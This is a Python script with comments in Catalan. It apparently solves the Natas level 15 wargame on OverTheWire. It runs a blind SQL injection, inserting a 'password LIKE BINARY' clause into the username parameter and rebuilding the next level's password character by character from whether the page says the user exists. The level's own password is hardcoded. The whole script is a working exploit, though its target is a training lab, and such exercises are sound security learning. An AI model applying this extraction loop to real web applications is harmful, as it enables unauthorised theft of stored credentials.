import requests, string

url = "http://natas15.natas.labs.overthewire.org"
username = "natas15"
# Password del nivell on estic
password = "TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB"
# Les contrasenyes del natas no tenen símbols per tant ens els estalviarem
# Posem tots els caràcters i lletres de l'abecedari (tant majúscules com minúscules)
# Comprova només els caràcters trets amb l'script anterior
characters = ['2', '3', '5', '7', '9', 'a', 'd', 'f', 'g', 'i', 'j', 'k', 'l', 'q', 'r', 'u', 'A', 'D', 'E', 'H', 'O', 'P', 'R', 'T', 'V', 'Z']

# Ara fem un for i anem guardant els caràcters que anem trobant per utilitzar-los després al segon script
#Passchar = []
# El que ens retorna l'aplicació web quan troba un usuari que existeix
userExist = 'This user exists.'
#Fem una variable per guardar la contrasenya
secret = ''

# Sabem que les passwords tenen màxim 32 caràcters
for place in range (1,32):
    for char in characters:
        # Necessitem anar guardant els caràcters, anirà sumant el caràcter
        temp = ''.join([secret,char])
        # Canviem la i d'abans per la nova variable temp que hem creat
        uri =''.join([url,'?','username=natas16"','+and+password+LIKE+BINARY+"',temp,'%','&debug'])
        r = requests.get(uri, auth=(username, password))
        if userExist in r.text:
            secret += char
            print(char)

print(secret)